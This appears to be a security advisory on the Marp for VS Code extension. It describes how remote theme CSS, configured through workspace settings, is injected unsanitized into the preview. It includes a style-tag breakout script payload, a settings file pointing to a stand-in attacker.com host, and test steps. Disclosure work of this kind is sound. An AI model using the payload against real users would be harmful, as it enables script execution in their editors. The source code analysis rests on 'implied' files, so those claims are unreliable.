# Marp for VS Code Vulnerabilities

Marp for VS Code implements several important security measures, including the use of VS Code's Workspace Trust feature to restrict potentially dangerous features in untrusted workspaces, importing and directly calling module functions rather than executing shell commands, disabling HTML rendering by default in untrusted workspaces, validating browser paths, creating temporary files using secure methods, and binding the workspace proxy server only to localhost. When dealing with browser launching, the extension uses Puppeteer which directly launches the browser rather than using shell commands, reducing command injection risks. Despite these measures, the following vulnerability has been identified:

## Remote Theme CSS Injection Leading to Arbitrary Code Execution

An attacker can supply a malicious repository (for example, via a manipulated `.vscode/settings.json` file) that sets the custom theme configuration (`markdown.marp.themes`) to point to an attacker‑controlled remote URL. When the victim opens the repository in a trusted workspace and renders a Marp Markdown document (with valid frontmatter such as `marp: true`), the extension will:
1. Fetch the remote CSS using a simple fetch (with a fixed 5‑second timeout) without performing any sanitization.
2. Store the fetched CSS as the theme's content.
3. Inject the CSS directly into the preview HTML inside a `<style>` tag.

If the attacker crafts the remote CSS to contain a closing `</style>` tag followed by a `<script>` tag (e.g., `</style><script>alert('RCE');</script><style>`), then the malicious payload will break out of the style block and execute arbitrary JavaScript in the preview WebView.

### Impact
Exploitation allows the attacker to execute arbitrary JavaScript in the context of the VS Code Markdown preview. This can lead to data exfiltration, manipulation of the user's session, or further escalation if additional API access is available.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
- The extension enforces workspace trust before running export commands and certain other features.  
- Remote fetch operations use a fixed 5‑second timeout.  
- However, no sanitization or validation is performed on the fetched CSS content.

### Missing Mitigations
- No validation or sanitization is applied to the CSS content fetched from remote URLs (which are configurable via workspace settings).  
- There is no check to ensure that the fetched CSS does not contain payloads that can break out of the `<style>` tag (such as embedded closing tags and subsequent script tags).  
- A strict Content Security Policy (CSP) or output sanitization mechanism is not enforced before injecting the CSS into the preview.

### Preconditions
- The victim opens a repository in a trusted workspace that contains a `.vscode/settings.json` file with the `markdown.marp.themes` configuration pointing to an attacker‑controlled URL.  
- The Markdown document to be rendered includes valid Marp frontmatter (e.g., `marp: true`) so that the custom theme is applied.  
- The extension's behavior in trusted workspaces allows remote resources to be loaded and injected without sanitization.

### Source Code Analysis
- **Themes Module (implied in `src/themes.ts`):**  
  The `registerTheme` function checks the user‑configured theme paths and for any remote URIs (as determined by a helper function) it performs a fetch with a 5‑second timeout. No sanitization or filtering is performed on the fetched content.
- **Extension Rendering (implied in `src/extension.ts`):**  
  After loading the themes, the extension loops over the registered styles and adds them via a function (e.g., `marp.themeSet.add(theme.css)`). Later on, when the Markdown preview is rendered, the CSS is inserted directly into the HTML output as follows:  
  ```html
  <style id="__marp-vscode-style">${style}</style>
  ```  
  If an attacker supplies CSS such as:
  ```css
  </style><script>alert('RCE');</script><style>
  ```  
  then the closing `</style>` tag terminates the style block and the `<script>` tag is executed in the preview.

### Security Test Case
1. **Setup the Malicious Repository:**  
   Create a repository that includes a `.vscode/settings.json` file with the following content:
   ```json
   {
     "markdown.marp.themes": [ "http://attacker.com/malicious.css" ]
   }
   ```
2. **Host the Malicious Payload:**  
   On an attacker‑controlled server, host a file at `http://attacker.com/malicious.css` with the content:
   ```css
   </style><script>alert('RCE');</script><style>
   ```
3. **Open a Marp Markdown Document:**  
   Open a Markdown document that begins with valid Marp frontmatter, for example:
   ```markdown
   ---
   marp: true
   theme: default
   ---
   
   # Sample Slide
   ```
4. **Observe the Outcome:**  
   When the Markdown preview is rendered, verify that the injected JavaScript is executed (for example, by observing an alert dialog with the text "RCE").
5. **Confirm Lack of Sanitization:**  
   Check that the remote CSS is fetched and inserted into the HTML without any validation or sanitization.